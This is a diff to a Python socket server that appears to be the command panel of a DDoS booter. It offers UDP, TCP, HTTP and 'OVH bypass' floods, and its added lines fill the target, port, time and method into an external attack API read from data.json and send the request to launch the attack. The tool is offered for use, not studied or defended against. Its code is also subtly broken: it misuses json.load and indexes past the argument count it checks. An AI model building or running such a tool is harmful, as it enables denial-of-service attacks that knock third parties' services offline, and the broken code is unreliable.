@@ -6,6 +6,7 @@
 import socket
 import requests
 import threading
+import json
 
 server_address = "1.1.1.1" # CHANGE THIS
 port = 9999 # CHANGE THIS IF YOU KNOW WHAT YOU'RE DOING
@@ -31,7 +32,7 @@ def handle(client):
           client.send("║ UDP - UDP Protocol Flood".encode())
           client.send("║ TCP - TCP Protocol Flood".encode())
           client.send("║ HTTP - HTTP 1.1 Flood".encode())
-          client.send("║ OVH - OVH Server Bypass\n\r".encode())
+          client.send("║ OVH - OVH Server Bypass\n\r\n\r".encode())
         elif cmd.startswith("attack"):
           cmd=cmd.split(" ")
           if len(cmd) != 4:
@@ -41,11 +42,17 @@ def handle(client):
             target = cmd[2]
             port = cmd[3]
             time = cmd[4]
+            with open("data.json", "r") as f:
+              data = json.load(f.read())
+            if method in data["methods"]:
+              r=requests.get(data["api"].replace("<<$target>>", target).replace("<<$port>>", port).replace("<<$time>>", time).replace("<<$method>>", method)).text
+              client.send(f"Attack Sent: {r}\n\r\n\r".encode())
    except:
      pass # connection closed
 
 sock.listen(1)
 
+print("Dark Net Is Listening For Connections")
 while True:
   client, address = sock.accept()
   print(f"Connection From {address[0]}:{address[1]}")
